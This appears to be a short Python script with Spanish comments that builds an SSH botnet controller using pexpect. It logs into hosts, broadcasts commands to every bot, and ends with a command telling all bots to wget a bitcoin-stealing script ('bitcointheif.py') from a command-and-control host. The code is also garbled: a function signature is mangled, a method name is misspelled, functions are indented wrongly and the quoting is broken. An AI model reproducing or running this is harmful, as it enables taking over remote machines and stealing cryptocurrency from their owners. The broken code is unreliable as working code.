from pexpect import pxssh

class Bot:
    # Inicializar nuevo Cliente
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()

    # Asegurar la shell Dentro del Cliente
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print("coneccion fallida")
            print(e)

    # enviar el comando al cliente
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.promp()
        return self.session.before

    # enviar una orden a todas las botnets

    def command_bots(command):
        for bot in botnet:
            attack = bot.send_command(command)
            print(" salida desde " + bot.host)
            print(attack)
    # lista de bots en la botnet
    botnet = []

    # Agregar una nueva bot a tu botnet
    def add_bot ( host, users("ls")

       command_bot, password):
        new_bot = Bot(host, user, password)
        botnet.append(new_bot)

    add_bot("10.0.0.59", " ", " ")

    # lista de usuarios del directorio
    command_bots("""wget  -O /users/Owner/Desktop/ "http://c&cserver.com/bitcointheif.py""")



